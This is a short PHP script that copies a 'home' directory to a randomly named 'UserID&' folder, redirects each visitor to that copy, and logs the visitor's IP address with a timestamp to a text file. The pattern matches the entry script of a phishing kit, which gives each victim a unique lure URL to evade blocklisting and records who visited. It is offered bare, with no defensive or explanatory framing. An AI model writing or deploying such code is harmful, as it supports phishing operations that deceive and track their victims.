<?php

	$random = rand(0000000000,1111111111);
	$ip = getenv("REMOTE_ADDR");

	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	}

	$dst = "UserID&" . $random;
	$src="home";

	recurse_copy( $src, $dst );
	header("location:$dst");

	$file = fopen("vu.txt","a");
	fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>
